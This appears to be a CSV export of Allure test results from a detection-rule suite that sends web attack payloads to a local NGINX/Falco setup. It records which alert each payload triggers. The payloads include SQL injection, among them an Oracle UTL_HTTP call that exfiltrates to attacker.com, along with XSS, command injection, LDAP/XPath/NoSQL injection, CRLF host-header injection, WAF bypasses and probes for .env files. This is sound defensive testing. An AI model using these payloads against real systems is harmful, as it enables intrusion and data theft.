"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_001` |
| **Name** | Oracle UTL_HTTP OOB Exfiltration |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--`
- **Encoded**: `'%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 08:55:35.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1772268935217-6tt0n pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1772268935217-6tt0n pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:35.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1772268935217-6tt0n pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[086_SQLI_OOB_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_002` |
| **Name** | AND operator with whoami |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `&& whoami`
- **Encoded**: `%26%26%20whoami`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 08:54:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1772268896096-r7gon pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1772268896096-r7gon pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1

**Falco Log Entry**:
```
08:54:56.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_002-1772268896096-r7gon pattern_id=CMD_BASIC_002 uri=/?q=%26%26%20whoami client=127.0.0.1
```","2","test_e2e_with_logs[329_CMD_BASIC_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SENSITIVE_DOCKER_002` |
| **Name** | Dockerfile access |
| **Category** | OTHER |
| **Subcategory** | sensitive_file |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/Dockerfile`
- **Encoded**: `%2FDockerfile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 08:55:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Sensitive] Sensitive file access attempt detected` |
| **Matched Rule** | `[NGINX Sensitive] Sensitive file access attempt detected test_id=SENSITIVE_DOCKER_002-1772268913625-7tlwe8 pattern_id=SENSITIVE_DOCKER_002 uri=/?q=%2FDockerfile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Sensitive] Sensitive file access attempt detected test_id=SENSITIVE_DOCKER_002-1772268913625-7tlwe8 pattern_id=SENSITIVE_DOCKER_002 uri=/?q=%2FDockerfile client=127.0.0.1

**Falco Log Entry**:
```
08:55:13.000000000: Warning [NGINX Sensitive] Sensitive file access attempt detected test_id=SENSITIVE_DOCKER_002-1772268913625-7tlwe8 pattern_id=SENSITIVE_DOCKER_002 uri=/?q=%2FDockerfile client=127.0.0.1
```","2","test_e2e_with_logs[538_SENSITIVE_DOCKER_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_058` |
| **Name** | SVG animate onbegin |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<svg><animate onbegin=alert(1)>`
- **Encoded**: `%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~75000ms
- **Timestamp**: 08:55:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_058-1772268914161-rcm23m pattern_id=XSS_ADV_058 uri=/?q=%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_058-1772268914161-rcm23m pattern_id=XSS_ADV_058 uri=/?q=%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:14.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_058-1772268914161-rcm23m pattern_id=XSS_ADV_058 uri=/?q=%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[136_XSS_ADV_058]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SENSITIVE_ENV_001` |
| **Name** | Env file access |
| **Category** | OTHER |
| **Subcategory** | env_exposure |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/.env`
- **Encoded**: `%2F.env`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~81000ms
- **Timestamp**: 08:55:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Sensitive] Sensitive file access attempt detected` |
| **Matched Rule** | `[NGINX Sensitive] Sensitive file access attempt detected test_id=SENSITIVE_ENV_001-1772268908615-g09dc9 pattern_id=SENSITIVE_ENV_001 uri=/?q=%2F.env client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Sensitive] Sensitive file access attempt detected test_id=SENSITIVE_ENV_001-1772268908615-g09dc9 pattern_id=SENSITIVE_ENV_001 uri=/?q=%2F.env client=127.0.0.1

**Falco Log Entry**:
```
08:55:08.000000000: Warning [NGINX Sensitive] Sensitive file access attempt detected test_id=SENSITIVE_ENV_001-1772268908615-g09dc9 pattern_id=SENSITIVE_ENV_001 uri=/?q=%2F.env client=127.0.0.1
```","2","test_e2e_with_logs[573_SENSITIVE_ENV_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HHI_MULTI_001` |
| **Name** | CRLF double Host injection |
| **Category** | HOST_HEADER |
| **Subcategory** | multi_host |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `Host: good.com\r\nHost: evil.com`
- **Encoded**: `Host%3A%20good.com%0d%0aHost%3A%20evil.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~17000ms
- **Timestamp**: 08:56:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Host Header] Host header injection attempt detected` |
| **Matched Rule** | `[NGINX Host Header] Host header injection attempt detected test_id=HHI_MULTI_001-1772268972613-968cmj pattern_id=HHI_MULTI_001 uri=/?q=Host%3A%20good.com%0d%0aHost%3A%20evil.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Host Header] Host header injection attempt detected test_id=HHI_MULTI_001-1772268972613-968cmj pattern_id=HHI_MULTI_001 uri=/?q=Host%3A%20good.com%0d%0aHost%3A%20evil.com client=127.0.0.1

**Falco Log Entry**:
```
08:56:12.000000000: Warning [NGINX Host Header] Host header injection attempt detected test_id=HHI_MULTI_001-1772268972613-968cmj pattern_id=HHI_MULTI_001 uri=/?q=Host%3A%20good.com%0d%0aHost%3A%20evil.com client=127.0.0.1
```","2","test_e2e_with_logs[672_HHI_MULTI_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_005` |
| **Name** | Conditional error-based blind injection |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1 --`
- **Encoded**: `%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~87000ms
- **Timestamp**: 08:55:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1772268902144-8nrep pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1772268902144-8nrep pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:02.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1772268902144-8nrep pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET
```","3","test_e2e_with_logs[031_SQLI_BLIND_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_007` |
| **Name** | Hash comment bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' UNION%23comment%0ASELECT version(),NULL,NULL--`
- **Encoded**: `'%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 08:55:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_007-1772268910665-hzh6o pattern_id=SQLI_BYPASS_007 uri=/?q='%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_007-1772268910665-hzh6o pattern_id=SQLI_BYPASS_007 uri=/?q='%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:10.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_007-1772268910665-hzh6o pattern_id=SQLI_BYPASS_007 uri=/?q='%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[061_SQLI_BYPASS_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_ATTR_002` |
| **Name** | LDAP Attribute Injection via objectClass |
| **Category** | LDAP |
| **Subcategory** | attribute_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `)(objectClass=person`
- **Encoded**: `)(objectClass=person`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~78000ms
- **Timestamp**: 08:55:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Attribute injection attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_002-1772268911108-yl0lf pattern_id=LDAP_ATTR_002 uri=/?q=)(objectClass=person client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_002-1772268911108-yl0lf pattern_id=LDAP_ATTR_002 uri=/?q=)(objectClass=person client=127.0.0.1

**Falco Log Entry**:
```
08:55:11.000000000: Warning [NGINX LDAP Injection] Attribute injection attempt test_id=LDAP_ATTR_002-1772268911108-yl0lf pattern_id=LDAP_ATTR_002 uri=/?q=)(objectClass=person client=127.0.0.1
```","2","test_e2e_with_logs[414_LDAP_ATTR_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_004` |
| **Name** | Polyglot CDATA injection |
| **Category** | XSS |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `]]><script>alert(1)</script><![CDATA[`
- **Encoded**: `%5D%5D%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!%5BCDATA%5B`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~78000ms
- **Timestamp**: 08:55:11.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_004-1772268911656-qra2ot pattern_id=XSS_POLY_004 uri=/?q=%5D%5D%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!%5BCDATA%5B client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_004-1772268911656-qra2ot pattern_id=XSS_POLY_004 uri=/?q=%5D%5D%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!%5BCDATA%5B client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:11.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_004-1772268911656-qra2ot pattern_id=XSS_POLY_004 uri=/?q=%5D%5D%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!%5BCDATA%5B client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[199_XSS_POLY_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_MONGO_006` |
| **Name** | MongoDB $or Authentication Bypass |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | mongodb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$or"": [{""username"": ""admin""}, {""username"": ""root""}]}`
- **Encoded**: `%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~51000ms
- **Timestamp**: 08:55:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1772268938114-7wzggb pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1772268938114-7wzggb pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1

**Falco Log Entry**:
```
08:55:38.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_006-1772268938114-7wzggb pattern_id=NOSQL_MONGO_006 uri=/?q=%7B%22%24or%22%3A%20%5B%7B%22username%22%3A%20%22admin%22%7D%2C%20%7B%22username%22%3A%20%22root%22%7D%5D%7D client=127.0.0.1
```","2","test_e2e_with_logs[667_NOSQL_MONGO_006]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XPATH_BOOL_002` |
| **Name** | XPath OR-based boolean with true() function |
| **Category** | XPATH |
| **Subcategory** | boolean_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' or true() or '`
- **Encoded**: `%27%20or%20true%28%29%20or%20%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 08:55:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XPath Injection] XPath injection attempt` |
| **Matched Rule** | `[NGINX XPath Injection] XPath injection attempt test_id=XPATH_BOOL_002-1772268923603-keoe2q pattern_id=XPATH_BOOL_002 uri=/?q=%27%20or%20true%28%29%20or%20%27 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BOOL_002-1772268923603-keoe2q pattern_id=XPATH_BOOL_002 uri=/?q=%27%20or%20true%28%29%20or%20%27 client=127.0.0.1

**Falco Log Entry**:
```
08:55:23.000000000: Warning [NGINX XPath Injection] XPath injection attempt test_id=XPATH_BOOL_002-1772268923603-keoe2q pattern_id=XPATH_BOOL_002 uri=/?q=%27%20or%20true%28%29%20or%20%27 client=127.0.0.1
```","2","test_e2e_with_logs[455_XPATH_BOOL_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `WAF_CONCAT_001` |
| **Name** | SQL concatenation bypass |
| **Category** | WAF_BYPASS |
| **Subcategory** | concatenation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `CONC'||'AT('a','b')`
- **Encoded**: `CONC%27%7C%7C%27AT%28%27a%27%2C%27b%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~7000ms
- **Timestamp**: 08:56:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected` |
| **Matched Rule** | `[NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_CONCAT_001-1772268982600-3nt7fh pattern_id=WAF_CONCAT_001 uri=/?q=CONC%27%7C%7C%27AT%28%27a%27%2C%27b%27%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_CONCAT_001-1772268982600-3nt7fh pattern_id=WAF_CONCAT_001 uri=/?q=CONC%27%7C%7C%27AT%28%27a%27%2C%27b%27%29 client=127.0.0.1

**Falco Log Entry**:
```
08:56:22.000000000: Warning [NGINX WAF Bypass] WAF bypass attempt detected test_id=WAF_CONCAT_001-1772268982600-3nt7fh pattern_id=WAF_CONCAT_001 uri=/?q=CONC%27%7C%7C%27AT%28%27a%27%2C%27b%27%29 client=127.0.0.1
```","2","test_e2e_with_logs[492_WAF_CONCAT_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_003` |
| **Name** | Table count discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>10 --`
- **Encoded**: `%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~88000ms
- **Timestamp**: 08:55:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_003-1772268901142-njnxeb pattern_id=SQLI_BLIND_003 uri=/?q=%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_003-1772268901142-njnxeb pattern_id=SQLI_BLIND_003 uri=/?q=%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:01.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_003-1772268901142-njnxeb pattern_id=SQLI_BLIND_003 uri=/?q=%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[029_SQLI_BLIND_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_013` |
| **Name** | Sleep with SQL comment |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP/*comment*/(5)`
- **Encoded**: `SLEEP/%2Acomment%2A/%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~103000ms
- **Timestamp**: 08:54:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1772268886611-iyyvs pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1772268886611-iyyvs pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:46.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1772268886611-iyyvs pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[118_SQLI_TIME_013]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_001` |
| **Name** | Noscript mutation XSS |
| **Category** | XSS |
| **Subcategory** | mutation_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<noscript><p title=""</noscript><img src=x onerror=alert('XSS')>"">`
- **Encoded**: `%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~93000ms
- **Timestamp**: 08:54:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_001-1772268896623-dk4st pattern_id=XSS_MUT_001 uri=/?q=%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E%22%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_001-1772268896623-dk4st pattern_id=XSS_MUT_001 uri=/?q=%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E%22%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:54:56.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_001-1772268896623-dk4st pattern_id=XSS_MUT_001 uri=/?q=%3Cnoscript%3E%3Cp%20title%3D%22%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E%22%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[183_XSS_MUT_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
